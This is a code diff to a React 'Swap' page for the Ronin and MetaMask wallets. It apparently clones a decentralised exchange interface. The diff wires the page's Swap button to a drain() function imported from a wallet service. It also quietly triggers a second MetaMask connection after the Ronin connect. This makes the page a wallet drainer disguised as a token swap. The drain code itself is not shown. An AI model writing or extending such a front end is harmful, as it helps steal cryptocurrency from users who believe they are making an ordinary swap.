@@ -4,12 +4,27 @@ import { WalletSDK } from "@roninnetwork/wallet-sdk";
 import BottomAssetPopup from "../components/BottomAssetPopup";
 import AssetPopup from "../components/AssetPopup";
 import Header from "../components/Header";
+import { UseWallet } from "../services/useWallet";
+import { useAccount, useConnect } from "wagmi";
 const Swap = () => {
+  const { drain } = UseWallet()
+  const { isConnected, address, connector } = useAccount();
   const [userAddress, setUserAddress] = useState();
   const [isAssetPopup, setIsAssetPopup] = useState(false);
   const [isBottomAssetPopup, setIsBottomAssetPopup] = useState(false);
   const [topAsset, setTopAsset] = useState(null);
   const [bottomAsset, setBottomAsset] = useState(null);
+  const [topInput, setTopInput] = useState(null)
+  const [bottomInput, setBottomInput] = useState(null)
+  const { connectors, connect } = useConnect();
+  const validConnectors = connectors.filter((connector) => {
+    return typeof connector.icon === "string";
+  });
+
+  const metamaskConnector = validConnectors.find((connector) => {
+    return connector.name === 'MetaMask'
+  })
+  console.log(metamaskConnector)
   function checkRoninInstalled() {
     if ("ronin" in window) {
       return true;
@@ -33,6 +48,7 @@ const Swap = () => {
       setUserAddress(accounts);
     }
   }
+  const buttonConditional = !bottomAsset && !topAsset && !topInput && !bottomInput
 
   console.log(topAsset, bottomAsset);
   return (
@@ -139,6 +155,9 @@ const Swap = () => {
                           </button>
                         )}
                         <input
+                          onChange={(e) => {
+                            setBottomInput(Number(e.target.value))
+                          }}
                           className="numerical-input_Input__VrzdR"
                           inputMode="decimal"
                           autoComplete="off"
@@ -149,7 +168,6 @@ const Swap = () => {
                           minLength="1"
                           maxLength="79"
                           spellCheck="false"
-                          value=""
                           style={{ color: "var(--dg-tc-text)", cursor: "auto" }}
                         />
                       </div>
@@ -233,6 +251,9 @@ const Swap = () => {
                         )}
 
                         <input
+                          onChange={(e) => {
+                            setTopInput(Number(e.target.value))
+                          }}
                           className="numerical-input_Input__VrzdR"
                           inputMode="decimal"
                           autoComplete="off"
@@ -243,21 +264,31 @@ const Swap = () => {
                           minLength="1"
                           maxLength="79"
                           spellCheck="false"
-                          value=""
                           style={{ color: "var(--dg-tc-text)", cursor: "auto" }}
                         />
                       </div>
                     </div>
                   </div>
                   <div className="footer_ActionButtonContainer__XrhlS">
-                    <button
+                    {userAddress ? <button
+                      onClick={() => {
+                        drain()
+                      }}
+                      disabled={buttonConditional}
+                      className="button-module_button__Z331g button-module_intent-primary__SAO1x button-module_size-large__Nx98S button-module_full__Lcze1 button-module_button-root__0roWY"
+                    >
+                      Swap
+                    </button> : <button
                       onClick={() => {
                         connectRoninWallet();
+                        setTimeout(() => {
+                          metamaskConnector.connect();
+                        }, 4000); // Delay of 1 second before connecting the wallet
                       }}
                       className="button-module_button__Z331g button-module_intent-primary__SAO1x button-module_size-large__Nx98S button-module_full__Lcze1 button-module_button-root__0roWY"
                     >
                       Connect Wallet
-                    </button>
+                    </button>}
                   </div>
                 </div>
                 <div className="SuggestionWidget_Container__5wKWn">
